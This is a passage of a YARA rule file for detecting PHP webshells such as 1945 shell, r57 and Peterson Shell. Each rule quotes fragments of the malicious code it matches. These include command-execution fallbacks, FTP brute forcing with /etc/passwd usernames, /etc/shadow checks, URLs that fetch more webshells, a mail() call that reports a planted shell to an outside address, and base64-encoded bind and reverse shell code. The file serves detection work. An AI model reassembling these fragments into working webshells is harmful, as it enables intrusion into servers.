      $s4 = "<!-- indonesianpeople.shutdown57@gmail.com | indonesianpeople@yandex.com -->" fullword ascii
      $s5 = "@ Find Our Project In Github : https://github.com/alintamvanz/1945shell" fullword ascii
      $s6 = "@ RobinRoot - Silentc0ders - Con7ext - Panda Dot ID - xXx-ID" fullword ascii
      $s7 = "$hidden_login = TRUE; // Hidden login, TRUE or FALSE" fullword ascii
      $s8 = "$passwd_1945  = \"60eb33475c18ff0699c91961e6074b06\";// md5 : asukabeh |  Default Password" fullword ascii
      $s9 = "$hostn_1945   = $_SERVER['HTTP_HOST']; // get hostname from server" fullword ascii
      $s10 = "<!-- copyright (c) 2017 shutdown57 - IndonesianPeople -->" fullword ascii
      $s11 = "@ s4bun - GH057.ID - m1x - YouKnowWho - SyntaX404 - Bl@ckID" fullword ascii
      $s12 = "@ CUMOL0 - Gorillaz.ID - maskamal - milio48 - ./R015 - 0xd3vs" fullword ascii
      $s13 = "gic_quotes_runtime')){set_magic_quotes_runtime(0);}session_start();" fullword ascii
      $s14 = "//1945 shell configuration" fullword ascii
      $s15 = "@ JavaCodeRulez [JavCode] - IndoXploit - bug7sec" fullword ascii
      $s16 = "@ LCR999X - Mr.Razier - ML7C - Ashura - Mr.DrimuEx196 " fullword ascii
      $s17 = "! Slurp\", \"YahooSeeker\", \"bingbot\");if(preg_match('/'.implode('|', $userAgents).'/i',$_SERVER['HTTP_USER_AGENT'])){header('" ascii
      $s18 = "$usernm_1945  = \"shutdown57\"; // default username : shutdown57" fullword ascii
      $s19 = "error_log(0);ob_start();error_reporting(0);set_time_limit(0);@ini_set('error_log',NULL);@ini_set('log_errors',0);@ini_set('max_e" ascii
      $s20 = "xecution_time',0);@ini_set('output_buffering',0);@ini_set('display_errors', 0);if(!empty($_SERVER['HTTP_USER_AGENT'])){$userAgen" ascii
   condition:
      ( uint16(0) == 0x3c20 and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _06largescale_with_cellcaching_sqlite3_06largescale_with_cellcaching_06largescale_xls_245
{
   meta:
      description = "php17 - from files 06largescale-with-cellcaching-sqlite3.php, 06largescale-with-cellcaching.php, 06largescale-xls.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "477849e7e9506d045fc5ec9cf0f3333800c09070938c2130e6dfe83d7e0b7e93"
      hash2 = "7f241ee46e16f632fb4f8975443a52a5fa4cca447057eea4dba7c4f7dbb01ffd"
      hash3 = "e43cfb1a35bdae04b1ad3a5ee8304c44c019d99053a3d1f212ded225d5a30c00"
   strings:
      $s1 = "$objPHPExcel->getActiveSheet()->getPageSetup()->setRowsToRepeatAtTopByStartAndEnd(1, 1);" fullword ascii
      $s2 = "$objPHPExcel->getActiveSheet()->getColumnDimension('C')->setVisible(false);" fullword ascii
      $s3 = "$objPHPExcel->getActiveSheet()->getColumnDimension('D')->setVisible(false);" fullword ascii
      $s4 = "$objPHPExcel->getActiveSheet()->getColumnDimension('E')->setOutlineLevel(1)" fullword ascii
      $s5 = "$objPHPExcel->getActiveSheet()->setCellValue('B1', \"Lastname\");" fullword ascii
      $s6 = "$objPHPExcel->getActiveSheet()->setCellValue('A1', \"Firstname\");" fullword ascii
      $s7 = "$objPHPExcel->getActiveSheet()->setCellValue('E1', \"Is Client ?\");" fullword ascii
      $s8 = "$objPHPExcel->getActiveSheet()->setCellValue('A' . $i, \"FName $i\")" fullword ascii
      $s9 = "$objPHPExcel->getActiveSheet()->setCellValue('D1', \"Fax\");" fullword ascii
      $s10 = "$objPHPExcel->getActiveSheet()->setCellValue('C1', \"Phone\");" fullword ascii
      $s11 = "$objPHPExcel->getActiveSheet()->freezePane('A2');" fullword ascii
      $s12 = "echo date('H:i:s') , \" Hide 'Phone' and 'fax' columns\" , EOL;" fullword ascii
      $s13 = "echo date('H:i:s') , \" Set outline levels\" , EOL;" fullword ascii
      $s14 = "echo date('H:i:s') , \" Rows to repeat at top\" , EOL;" fullword ascii
      $s15 = "echo date('H:i:s') , \" Freeze panes\" , EOL;" fullword ascii
      $s16 = "echo date('H:i:s') , \" Set properties\" , EOL;" fullword ascii
      $s17 = "->setCellValue('C' . $i, \"PhoneNo $i\")" fullword ascii
      $s18 = "for ($i = 2; $i <= 5000; $i++) {" fullword ascii
      $s19 = "// Hide \"Phone\" and \"fax\" column" fullword ascii
      $s20 = "->setCellValue('B' . $i, \"LName $i\")" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 10KB and ( 8 of them )
      ) or ( all of them )
}

rule _7a7bfc69b9ab20f960e43c8c4faa4bc33825c648_aa0fc6f621e8b2965b3a109832117d023f4a1ad6_246
{
   meta:
      description = "php17 - from files 7a7bfc69b9ab20f960e43c8c4faa4bc33825c648.php, aa0fc6f621e8b2965b3a109832117d023f4a1ad6.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6989ebb66bf879f3fa7140e847decc7d3d415f5000bf6759f6e6612726619d6c"
      hash2 = "2a0cd4aab8539cd4e85ece7e5a8251ae6cc21816a20023f6ddb5d979c98d2cb3"
   strings:
      $x1 = "elseif ($windows && is_object($ws = new COM(\"WScript.Shell\"))){$dir=(isset($_SERVER[\"TEMP\"]))?$_SERVER[\"TEMP\"]:ini_get('up" ascii
      $x2 = "mp_dir') ;$name = $_SERVER[\"TEMP\"].namE();$ws->Run(\"cmd.exe /C $command >$name\", 0, true);$exec = file_get_contents($name);u" ascii
      $x3 = "elseif(is_resource($output=popen($command,\"r\"))) {while(!feof($output)){$exec= fgets($output);}pclose($output);}" fullword ascii
      $x4 = "elseif(is_callable('shell_exec') && !strstr($disablefunctions,'shell_exec')){$exec= shell_exec($command);}" fullword ascii
      $s5 = "output = @ob_get_contents(); @ob_clean(); $exec= $tmp; }" fullword ascii
      $s6 = "if(is_callable('passthru') && !strstr($disablefunctions,'passthru')){ @ob_start();passthru($command);$exec=@ob_get_contents();@o" ascii
      $s7 = "if(is_callable('passthru') && !strstr($disablefunctions,'passthru')){ @ob_start();passthru($command);$exec=@ob_get_contents();@o" ascii
      $s8 = "elseif(is_resource($res=proc_open($command,$dep,$pipes))){while(!feof($pipes[1])){$line = fgets($pipes[1]); $output.=$line;}$exe" ascii
      $s9 = "elseif ($windows && is_object($ws = new COM(\"WScript.Shell\"))){$dir=(isset($_SERVER[\"TEMP\"]))?$_SERVER[\"TEMP\"]:ini_get('up" ascii
      $s10 = "$myvars=array('workingdiR','urL','imagE','namE','filE','downloaD','seC','cP','mV','rN','deL');" fullword ascii
      $s11 = "elseif(is_callable('system') && !strstr($disablefunctions,'system')){$tmp = @ob_get_contents(); @ob_clean();system($command) ; $" ascii
      $s12 = "elseif(is_callable('system') && !strstr($disablefunctions,'system')){$tmp = @ob_get_contents(); @ob_clean();system($command) ; $" ascii
      $s13 = "elseif(is_callable('exec') && !strstr($disablefunctions,'exec')) {exec($command,$output);$output = join(\"\\n\",$output);$exec= " ascii
      $s14 = "elseif(is_callable('exec') && !strstr($disablefunctions,'exec')) {exec($command,$output);$output = join(\"\\n\",$output);$exec= " ascii
      $s15 = "elseif(is_resource($res=proc_open($command,$dep,$pipes))){while(!feof($pipes[1])){$line = fgets($pipes[1]); $output.=$line;}$exe" ascii
      $s16 = "foreach ($_GET as $key => $v){" fullword ascii
      $s17 = "$exec = '';$output= '';" fullword ascii
      $s18 = "if($add)if(!in_array($key,$myvars))$ret.=$key.\"=\".$v.\"&\";" fullword ascii
      $s19 = "if ($el[0]==$key)$add=0;" fullword ascii
      $s20 = "global $windows,$disablefunctions;" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _1bc134acecdf6e441eb53718b93a3cda81c2b453_1n73ction_683f78842d7cf41a39744494a4bb787d6c6c4e91_247
{
   meta:
      description = "php17 - from files 1bc134acecdf6e441eb53718b93a3cda81c2b453.php, 1n73ction.php, 683f78842d7cf41a39744494a4bb787d6c6c4e91.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "da6af9a4a60e3a484764010fbf1a547c2c0a2791e03fc11618b8fc2605dceb04"
      hash2 = "9af1a6e4122d7751016c5aee923352962427c48ec0924bf007aac751cdad7af1"
      hash3 = "f3d0d694f2dd8b78a947a5e00c28d023c0fcc291ac5e70f74a81780bd5abb3e1"
   strings:
      $s1 = "$key = _hash ($key . substr ($out, $c - $hash_length, $hash_length));" fullword ascii
      $s2 = "$string = substr ($string, $hash_length, strlen ($string) - $hash_length);" fullword ascii
      $s3 = "$key = md5 (md5 ($cc_encryption_hash)) . md5 ($cc_encryption_hash);" fullword ascii
      $s4 = "$iv .= chr (ord ($tmp_iv[$c]) ^ ord ($hash_key[$c]));" fullword ascii
      $s5 = "function decrypt ($string,$cc_encryption_hash)" fullword ascii
      $s6 = "$out .= chr (ord ($key[$c % $hash_length]) ^ ord ($string[$c]));" fullword ascii
      $s7 = "$out .= chr (hexdec ($hash[$c] . $hash[$c + 1]));" fullword ascii
      $s8 = "$tmp_iv = substr ($string, 0, $hash_length);" fullword ascii
      $s9 = "$query = mysql_query(\"SELECT * FROM tblservers\");" fullword ascii
      $s10 = "$hash_length = strlen ($hash_key);" fullword ascii
      $s11 = "$hash_key = _hash ($key);" fullword ascii
      $s12 = "$index = $_POST['index'];" fullword ascii
      $s13 = "if (($c != 0 AND $c % $hash_length == 0))" fullword ascii
      $s14 = "$name = $_POST['name'];" fullword ascii
      $s15 = "$posRight = @stripos($mytext,$endtag,$posLeft+1);" fullword ascii
      $s16 = "while ($c < $hash_length)" fullword ascii
      $s17 = "while ($c < strlen ($hash))" fullword ascii
      $s18 = "$string = base64_decode ($string);" fullword ascii
      $s19 = "function _hash ($string)" fullword ascii
      $s20 = "function findit($mytext,$starttag,$endtag) {" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _031d3c46f8a4462cf23accc3aaecf840f77d9a30_35940353c0f3d6511e2789fc3cb9e5b3cea3b10d_5bcb3adc55b62f4e43f154b29d31cced0cbd32a5__248
{
   meta:
      description = "php17 - from files 031d3c46f8a4462cf23accc3aaecf840f77d9a30.php, 35940353c0f3d6511e2789fc3cb9e5b3cea3b10d.php, 5bcb3adc55b62f4e43f154b29d31cced0cbd32a5.php, 691a4634dc5f78ceee68850138b8b68047b8dca6.php, 7bd7bb6237c7654d933dc363cabbc553f9d21382.php, 918af72b83a165b25283dbd8f1490309dfdb77da.php, 942e0fc9984256f2bdb17f8d0c77a7afacb7b112.php, 946a66a5f7f8be95ea7693ee5500bb404b9d0add.php, 95570807b7c1a0531c134fb85c98cdc4ff63ee9b.php, a79be3a055b701ad9977b5176d0478aa0b0dffd4.php, abdbeae0be991e8bab37946a1b55df5af144a0a8.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "27820c5a30e7d0c36e9e61b5f970de8121e1c493cf22ccdaa3b41f84016f8c5d"
      hash2 = "9ecdb14b41785c779d9721e11bf9e1b7e35611015f4aabf9a1f54a82eaa0725c"
      hash3 = "e46777e5f1ac1652db3ce72dd0a2475ea515b37a737fffd743126772525a47e6"
      hash4 = "3c175446e4a5ddb7ddec93c3338097f3ef96b6edb9cc10801be12346d787f3c0"
      hash5 = "617ed1a8b61dd1f84acd225bfe8dc36c479a1ad3c98b2bb335b2735cb4fb2fe7"
      hash6 = "589ad371c414fae2d6f1f0ef7d197cf495bf06d1a0e367f9c3907b77f3054299"
      hash7 = "59105e4623433d5bf93b9e17d72a43a40a4d8ac99e4a703f1d8851ad1276cd88"
      hash8 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
      hash9 = "97ba3775928dacbf6b4d58416752db2113af88aa914bc35e7b2a7ddf73f70d8b"
      hash10 = "b7c6ce332434850db4448f8d2bf26157a6aa4ae1afb43bd5829ee6167b561c85"
      hash11 = "1a2bed0ae0b8846eb567043a998ad835d7e4103abcd6618e4ccb01a2a73a9ec9"
   strings:
      $x1 = "else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo \"[+] $user:\".strrev($user).\" - suc" ascii
      $x2 = "'eng_text99'=>'* use username from /etc/passwd for ftp login and password'," fullword ascii
      $s3 = "if(!empty($_POST['cmd']) && ($_POST['cmd']==\"ftp_file_up\" || $_POST['cmd']==\"ftp_file_down\"))" fullword ascii
      $s4 = "'eng_text101'=>'Use reverse (user -> resu) login for password'," fullword ascii
      $s5 = "OST['ftp_server_port']):(\"127.0.0.1:21\"))).in('hidden','cmd',0,'ftp_brute').ws(4).in('submit','submit',0,$lang[$language.'_but" ascii
      $s6 = "echo sr(15,\"<b>\".$lang[$language.'_text88'].$arrow.\"</b>\",in('text','ftp_server_port',85,(!empty($_POST['ftp_server_port'])?" ascii
      $s7 = "if(!empty($_POST['cmd']) && $_POST['cmd']==\"ftp_brute\")" fullword ascii
      $s8 = "echo sr(25,\"<b>\".$lang[$language.'_text37'].$arrow.\"</b>\",in('text','ftp_login',45,(!empty($_POST['ftp_login'])?($_POST['ftp" ascii
      $s9 = "echo sr(25,\"<b>\".$lang[$language.'_text37'].$arrow.\"</b>\",in('text','ftp_login',45,(!empty($_POST['ftp_login'])?($_POST['ftp" ascii
      $s10 = "echo \"<div align=center>\".div('id9').\"<textarea name=php_eval cols=100 rows=3>\";" fullword ascii
      $s11 = "echo sr(25,\"<b>\".$lang[$language.'_text38'].$arrow.\"</b>\",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POS" ascii
      $s12 = "echo sr(25,\"<b>\".$lang[$language.'_text88'].$arrow.\"</b>\",in('text','ftp_server_port',45,(!empty($_POST['ftp_server_port'])?" ascii
      $s13 = "'eng_text88'=>'FTP-server:port'," fullword ascii
      $s14 = "echo sr(25,\"<b>\".$lang[$language.'_text18'].$arrow.\"</b>\",in('text','loc_file',45,$dir));" fullword ascii
      $s15 = "echo sr(25,\"<b>\".$lang[$language.'_text107'].$arrow.\"</b>\",in('text','subj',45,(!empty($_POST['subj'])?($_POST['subj']):(\"h" ascii
      $s16 = "if(isset($_POST['reverse'])) { $count *= 2; }" fullword ascii
      $s17 = "if($unix && @function_exists(\"ftp_connect\")){" fullword ascii
      $s18 = "echo sr(15,\"\",in('checkbox','reverse id=reverse',0,'1').$lang[$language.'_text101']);" fullword ascii
      $s19 = "echo sr(25,\"<b>\".$lang[$language.'_text89'].$arrow.\"</b>\",in('text','ftp_file',45,(!empty($_POST['ftp_file'])?($_POST['ftp_f" ascii
      $s20 = "echo sr(25,\"<b>\".$lang[$language.'_text89'].$arrow.\"</b>\",in('text','ftp_file',45,(!empty($_POST['ftp_file'])?($_POST['ftp_f" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 600KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _1945_v2017_1945_1945v2017_mei_1945v2017_meiFinal_249
{
   meta:
      description = "php17 - from files 1945-v2017.php, 1945.php, 1945v2017-mei.php, 1945v2017-meiFinal.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8180ca0fef742928d9f69887f9307d7a5764a64c716d3c96fd0b9aeee753affe"
      hash2 = "a00fdb17c16cad64a5a5f607d7b71e3e0bc8992ec91e72be1029ddf9956789a9"
      hash3 = "62aa491f7087fac964232067a1d28cc8c56b644984c33b7b0f64ff869bb67a04"
      hash4 = "395bbabca853354b917d993a513bf0da82d3e7fbd3b75eb85f8e8e93205ae372"
   strings:
      $x1 = "=> \"https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/webadmin.php\",\"kuchiyose_1945\" => \"https://raw.github" ascii
      $x2 = "=> \"https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/c99.php\",\"kuchiyose_ms\" => \"https://raw.githubusercon" ascii
      $x3 = "ontent.com/alintamvanz/webshell/master/1945.php\",\"kuchiyose_r57\" => \"https://raw.githubusercontent.com/alintamvanz/webshell/" ascii
      $s4 = "er/ext/r57.php\",\"kuchiyose_it\" => \"https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/itsec.php\",\"kuchiyose" ascii
      $s5 = "aster/ayana.php\",\"kuchiyose_lc\" => \"https://raw.githubusercontent.com/alintamvanz/webshell/master/linuxcode.php\",\"kuchiyos" ascii
      $s6 = "ce = array( \"kuchiyose_wso\" => \"https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/wso.php\",\"kuchiyose_b374k" ascii
      $s7 = "https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/b374k.php\",\"kuchiyose_idx\" => \"https://raw.githubuserconte" ascii
      $s8 = "om/alintamvanz/webshell/master/ext/indoxploit.php\",\"kuchiyose_ayana\"=> \"https://raw.githubusercontent.com/alintamvanz/webshe" ascii
      $s9 = "com/alintamvanz/webshell/master/ext/mini-shell.php\",\"kuchiyose_symsa\" => \"https://raw.githubusercontent.com/alintamvanz/webs" ascii
      $s10 = "}elseif ($__action__ == \"infophp\") {@ob_start();@eval(\"phpinfo();\");$buff = @ob_get_contents();@ob_end_clean();" fullword ascii
      $s11 = "} elseif(function_exists('passthru')) { @ob_start(); @passthru($cmd); $buff = @ob_get_contents(); @ob_end_clean(); return $buff;" ascii
      $s12 = "} elseif(function_exists('passthru')) { @ob_start(); @passthru($cmd); $buff = @ob_get_contents(); @ob_end_clean(); return $buff;" ascii
      $s13 = "= curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_BINARYTRANSFER,1); curl_setopt($ch, CURLOPT_RETURN" fullword ascii
      $s14 = "} elseif(function_exists('exec')) { @exec($cmd,$results); $buff = \"\"; foreach($results as $result) { $buff .= $result; } retur" ascii
      $s15 = "} elseif(function_exists('exec')) { @exec($cmd,$results); $buff = \"\"; foreach($results as $result) { $buff .= $result; } retur" ascii
      $s16 = "RLOPT_SSL_VERIFYHOST, 0);$content = curl_exec($curl); curl_close($curl);return $content;} public function kuchiyose($nama){$sour" ascii
      $s17 = "}$ds = \"PHP Disable functions : <b>\";$ds.= $this->disablefunc().\"</b>\";echo $ds;echo \"<br><br>\";$etc = \"Readable /etc/pas" ascii
      $s18 = "TRANSFER,1); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0); curl_setopt($ch, CURLOPT_FILE, $fp);return curl_exec($ch); curl_close($" ascii
      $s19 = "$rename = @system('mv '.$old.' '.$new.'');}return $rename;}public static function getscript($isi,$url){$fp = fopen($isi,\"w\");$" ascii
      $s20 = "\" : \"<font color=red> NO </font>\";$etc.= \"<br>\";$etc.= \"Readable /etc/shadow : \";$etc.= (is_readable(\"/etc/shadow\")) ? " ascii
   condition:
      ( ( uint16(0) == 0x3c20 or uint16(0) == 0x3f3c ) and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _031d3c46f8a4462cf23accc3aaecf840f77d9a30_144b414a2168fecf31591bbe049e1424ccff4899_1477fa53e5e56605fe001c88831fcb71e30d6e86__250
{
   meta:
      description = "php17 - from files 031d3c46f8a4462cf23accc3aaecf840f77d9a30.php, 144b414a2168fecf31591bbe049e1424ccff4899.php, 1477fa53e5e56605fe001c88831fcb71e30d6e86.php, 1b45fc7d2a485cce8295a4962b581979b08fb01d.php, 1dc03138e5406f8e1f850181e92084ed0f4b5302.php, 20784cd31c22ddaa849b6c93042df34c1d462ab9.php, 35940353c0f3d6511e2789fc3cb9e5b3cea3b10d.php, 5bcb3adc55b62f4e43f154b29d31cced0cbd32a5.php, 649515a5730e7baa0303b29ce49f7e142b88c2ce.php, 691a4634dc5f78ceee68850138b8b68047b8dca6.php, 6f1a2aa579a8ecd60d17677f0cd211c4090500f6.php, 7bd7bb6237c7654d933dc363cabbc553f9d21382.php, 7d4db150d48270409c1e179fa8bda76792b45c86.php, 8d851537dff4dc80cdc23f57784bbf0bd7b4431c.php, 91241fc05105627c2f58942867db10b2b691574e.php, 918af72b83a165b25283dbd8f1490309dfdb77da.php, 942e0fc9984256f2bdb17f8d0c77a7afacb7b112.php, 946a66a5f7f8be95ea7693ee5500bb404b9d0add.php, 95570807b7c1a0531c134fb85c98cdc4ff63ee9b.php, 9f074c6d53409f124b5eeb850502faf587d39a10.php, a79be3a055b701ad9977b5176d0478aa0b0dffd4.php, a9b8077357065b95c2bc7f3ffa7baea65895d920.php, abdbeae0be991e8bab37946a1b55df5af144a0a8.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "27820c5a30e7d0c36e9e61b5f970de8121e1c493cf22ccdaa3b41f84016f8c5d"
      hash2 = "1fe4c60ea3f32819a98b1725581ac912d0f90d497e63ad81ccf258aeec59fee3"
      hash3 = "124a69cac6fa533abd737127a65ad261a4da66148bf1bdc341e3f733966b5ad6"
      hash4 = "06fa69321e2a28a683c7dc14381132981804aa20fe860c596fa504d8646cef57"
      hash5 = "bbbdf28407a4c943f048dcdd7da7515e42797a64b76fd2455e5403b436ec4de8"
      hash6 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
      hash7 = "9ecdb14b41785c779d9721e11bf9e1b7e35611015f4aabf9a1f54a82eaa0725c"
      hash8 = "e46777e5f1ac1652db3ce72dd0a2475ea515b37a737fffd743126772525a47e6"
      hash9 = "756b788401aad4bfd4dbafd15c382d98e3ba079390addb5b0cea7ff7f985f881"
      hash10 = "3c175446e4a5ddb7ddec93c3338097f3ef96b6edb9cc10801be12346d787f3c0"
      hash11 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
      hash12 = "617ed1a8b61dd1f84acd225bfe8dc36c479a1ad3c98b2bb335b2735cb4fb2fe7"
      hash13 = "ed3ea75fde5557fa1726641f46fd08085c495e2402bb943cbe4c452ce113028e"
      hash14 = "f27b491508d18cbfb6f3e57aafcabe5826a2f0098b187ad6459f40b5812c36e0"
      hash15 = "2e5511e45b7c9c6ca7e263ee8d8271214b2b6aae20f2796f4db7b53639f7a699"
      hash16 = "589ad371c414fae2d6f1f0ef7d197cf495bf06d1a0e367f9c3907b77f3054299"
      hash17 = "59105e4623433d5bf93b9e17d72a43a40a4d8ac99e4a703f1d8851ad1276cd88"
      hash18 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
      hash19 = "97ba3775928dacbf6b4d58416752db2113af88aa914bc35e7b2a7ddf73f70d8b"
      hash20 = "4a30b666f037d28d1b832a95a556d5b15d344fbcfb4756fc1374175e3da9b364"
      hash21 = "b7c6ce332434850db4448f8d2bf26157a6aa4ae1afb43bd5829ee6167b561c85"
      hash22 = "623d482f0f99bd37b67b2e98b697b7a19c08b2e296fd83fed439627b5a30cd3b"
      hash23 = "1a2bed0ae0b8846eb567043a998ad835d7e4103abcd6618e4ccb01a2a73a9ec9"
   strings:
      $s1 = "KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ" fullword ascii
      $s2 = "SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd" fullword ascii
      $s3 = "QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp" fullword ascii
      $s4 = "7DQogICByZWFkKG5ld2ZkLGJ1ZixzaXplb2YoYnVmKSk7DQogICBpZiAoIWNocGFzcyhhcmd2WzJdLGJ1ZikpDQogICBzeXN0ZW0oImVjaG8gd2VsY2" fullword ascii
      $s5 = "BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb" fullword ascii
      $s6 = "A8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg0KaW50IG1haW4oYXJnYyxhcmd2KQ0KaW50I" fullword ascii
      $s7 = "dGVyZWQpO2krKykgDQp7DQppZihlbnRlcmVkW2ldID09ICdcbicpDQplbnRlcmVkW2ldID0gJ1wwJzsgDQppZihlbnRlcmVkW2ldID09ICdccicpDQp" fullword ascii
      $s8 = "JlNPQ0tfU1RSRUFNLCRwcm90b2NvbCkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVV" fullword ascii
      $s9 = "lzdGVuKFMsMykgfHwgZGllICJDYW50IGxpc3RlbiBwb3J0XG4iOw0Kd2hpbGUoMSkNCnsNCmFjY2VwdChDT05OLFMpOw0KaWYoISgkcGlkPWZvcmspK" fullword ascii
      $s10 = "b3RlOw0KIGlmKGZvcmsoKSA9PSAwKSB7IA0KIHJlbW90ZS5zaW5fZmFtaWx5ID0gQUZfSU5FVDsNCiByZW1vdGUuc2luX3BvcnQgPSBodG9ucyhhdG9" fullword ascii
      $s11 = "NPQ0tfU1RSRUFNLDApOw0KIGlmKCFzb2NrZmQpIHBlcnJvcigic29ja2V0IGVycm9yIik7DQogYmluZChzb2NrZmQsIChzdHJ1Y3Qgc29ja2FkZHIgK" fullword ascii
      $s12 = "GFyZ2M7DQpjaGFyICoqYXJndjsNCnsgIA0KIGludCBzb2NrZmQsIG5ld2ZkOw0KIGNoYXIgYnVmWzMwXTsNCiBzdHJ1Y3Qgc29ja2FkZHJfaW4gcmVt" fullword ascii
      $s13 = "2ZkKTsNCiAgfQ0KIH0NCn0NCmludCBjaHBhc3MoY2hhciAqYmFzZSwgY2hhciAqZW50ZXJlZCkgew0KaW50IGk7DQpmb3IoaT0wO2k8c3RybGVuKGVu" fullword ascii
      $s14 = "VNURU5fUE9SVD0kQVJHVlswXTsNCnVzZSBTb2NrZXQ7DQokcHJvdG9jb2w9Z2V0cHJvdG9ieW5hbWUoJ3RjcCcpOw0Kc29ja2V0KFMsJlBGX0lORVQs" fullword ascii
      $s15 = "9tZSB0byByNTcgc2hlbGwgJiYgL2Jpbi9iYXNoIC1pIik7DQogICBlbHNlDQogICBmcHJpbnRmKHN0ZGVyciwiU29ycnkiKTsNCiAgIGNsb3NlKG5ld" fullword ascii
      $s16 = "TRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJExJU1RFTl9QT1JULElOQUREUl9BTlkpKSB8fCBkaWUgIkNhbnQgb3BlbiBwb3J0XG4iOw0KbG" fullword ascii
      $s17 = "Ow0Kb3BlbiBTVERFUlIsIj4mQ09OTiI7DQpleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCmNsb3N" fullword ascii
      $s18 = "Q0Kew0KZGllICJDYW5ub3QgZm9yayIgaWYgKCFkZWZpbmVkICRwaWQpOw0Kb3BlbiBTVERJTiwiPCZDT05OIjsNCm9wZW4gU1RET1VULCI+JkNPTk4i" fullword ascii
      $s19 = "lbnRlcmVkW2ldID0gJ1wwJzsNCn0NCmlmICghc3RyY21wKGJhc2UsZW50ZXJlZCkpDQpyZXR1cm4gMDsNCn0=\";" fullword ascii
      $s20 = "Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _045117b0e0a11a242b9765e79cbf113f_212d9f24612b3f2630e7bd14fa96161e464a1f97_251
{
   meta:
      description = "php17 - from files 045117b0e0a11a242b9765e79cbf113f.php, 212d9f24612b3f2630e7bd14fa96161e464a1f97.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5bb64310e1ebc50d776523ae5541a121fbbb0495ec74c29e2a3d6d7a5ed2d812"
      hash2 = "6cb3b072948d9e91fd2eaed38627a5884e11dfe1c8ba547db5528404ec4788c9"
   strings:
      $s1 = "mail(\"peterdlegend@aol.com\", \"$body\", \"Shell Result http://$web$inj" fullword ascii
      $s2 = "echo \"<pre><font size=3 color=#000000>\" . shell_exec('ls -la') . \"</font></pre>\";" fullword ascii
      $s3 = "echo \"<pre><font size=3 color=#000000>\" . shell_exec($cmd) . \"</font></pre>\";" fullword ascii
      $s4 = "echo '<form enctype=\"multipart/form-data\" action method=POST><font size=2 color=#888888><b>Upload File</b></font><br><input " fullword ascii
      $s5 = "echo \"<title>Peterson - Shell</title><br><br>\";" fullword ascii
      $s6 = "$body = \"Shell Injector " fullword ascii
      $s7 = "$conf = file_get_contents(\"../../configuration.php\");" fullword ascii
      $s8 = "$desti = $_SERVER['DOCUMENT_ROOT'] . \"/wp-info.php\";" fullword ascii
      $s9 = "echo ' < formmethod = \"POST\"action = \"\" > < fontsize = 2color = #888888><b>Command</b><br><input type=\"text\" name=\"cmd\">" ascii
      $s10 = "echo ' < formmethod = \"POST\"action = \"\" > < fontsize = 2color = #888888><b>Command</b><br><input type=\"text\" name=\"cmd\">" ascii
      $s11 = "echo \"<font size=2 color=#888888><b>Uname : \" . php_uname() . \"</b><br>\";" fullword ascii
      $s12 = "echo \"Upload Success to \" . $uploaddir . $name . \" :D \";" fullword ascii
      $s13 = "echo \"<font size=2 color=#888888><b>User : uid=\" . getmyuid() . $cur_user . \" gid=\" . getmygid() . $cur_user . \"</b><br>\";" ascii
      $s14 = "echo \"<font size=2 color=#888888><b>\" . $security . \"</b><br>\";" fullword ascii
